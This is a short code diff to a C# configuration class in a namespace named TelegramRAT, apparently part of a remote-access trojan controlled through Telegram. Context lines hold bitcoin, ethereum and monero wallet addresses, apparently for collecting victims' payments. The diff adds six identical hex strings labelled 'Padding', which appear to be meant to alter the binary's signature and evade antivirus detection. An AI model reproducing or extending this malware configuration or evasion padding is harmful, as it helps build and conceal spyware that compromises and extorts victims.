@@ -67,5 +67,13 @@ namespace TelegramRAT
         public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";
         public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";
         public static string monero_address = "42Pwy6Xe4mPTz3mLap7AB5Jjd9NBt1MWjiqyvEFx3Fn8Fo9cRw9aJUHE1iTXEpUbQacMNiSxYejBKFE7UdGnyEncEECJey9";
+
+        // Padding
+        public static string pad0 = "7475d400a39a98a406c4ba369cfb6850f169c2fecfeda1f2fed2871af76abb76eb45febb380663da2abbf46f12875740ea5ab8d83150578b46dac76c53d29113";
+        public static string pad1 = "7475d400a39a98a406c4ba369cfb6850f169c2fecfeda1f2fed2871af76abb76eb45febb380663da2abbf46f12875740ea5ab8d83150578b46dac76c53d29113";
+        public static string pad2 = "7475d400a39a98a406c4ba369cfb6850f169c2fecfeda1f2fed2871af76abb76eb45febb380663da2abbf46f12875740ea5ab8d83150578b46dac76c53d29113";
+        public static string pad3 = "7475d400a39a98a406c4ba369cfb6850f169c2fecfeda1f2fed2871af76abb76eb45febb380663da2abbf46f12875740ea5ab8d83150578b46dac76c53d29113";
+        public static string pad4 = "7475d400a39a98a406c4ba369cfb6850f169c2fecfeda1f2fed2871af76abb76eb45febb380663da2abbf46f12875740ea5ab8d83150578b46dac76c53d29113";
+        public static string pad5 = "7475d400a39a98a406c4ba369cfb6850f169c2fecfeda1f2fed2871af76abb76eb45febb380663da2abbf46f12875740ea5ab8d83150578b46dac76c53d29113";
     }
 }
